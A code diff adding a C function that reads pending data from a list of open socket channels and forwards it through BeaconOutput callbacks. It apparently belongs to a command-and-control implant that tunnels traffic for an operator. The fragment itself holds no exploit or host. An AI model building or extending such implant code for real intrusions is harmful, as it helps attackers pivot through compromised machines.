@@ -289,3 +289,52 @@ int ChannelReceiveDataInternal(SOCKET socket, char* buffer, int length)
 	}
 	return total;
 }
+
+char* gChannelBuffer;
+int ChannelReceiveData()
+{
+#define CHANNEL_BUFFER_SIZE 0x100000
+	if(!gChannelBuffer)
+		gChannelBuffer = malloc(CHANNEL_BUFFER_SIZE);
+
+	if(!gChannels)
+		return 0;
+
+	int size = 0;
+	int numProcessedChannels = 0;
+	for(CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
+	{
+		if(channel->state != CHANNEL_STATE_1)
+			continue;
+
+		*(int*)gChannelBuffer = htonl(channel->id);
+		int ioctlresult = ioctlsocket((SOCKET)channel->socket, FIONREAD, &size);
+
+		size = min(size, CHANNEL_BUFFER_SIZE - sizeof(int));
+
+		if(ioctlresult == SOCKET_ERROR)
+			goto callback_close;
+
+		if (size)
+		{
+			int totalReceived = ChannelReceiveDataInternal((SOCKET)channel->socket,
+			                                               gChannelBuffer + sizeof(int), size);
+			if (totalReceived == SOCKET_ERROR)
+				goto callback_close;
+
+			if (totalReceived == size)
+			{
+				BeaconOutput(CALLBACK_READ, gChannelBuffer, size + sizeof(int));
+				numProcessedChannels++;
+			}
+		}
+
+		continue;
+
+	callback_close:
+		channel->state = CHANNEL_STATE_0;
+		BeaconOutput(CALLBACK_CLOSE, gChannelBuffer, sizeof(int));
+	}
+
+	return numProcessedChannels;
+}
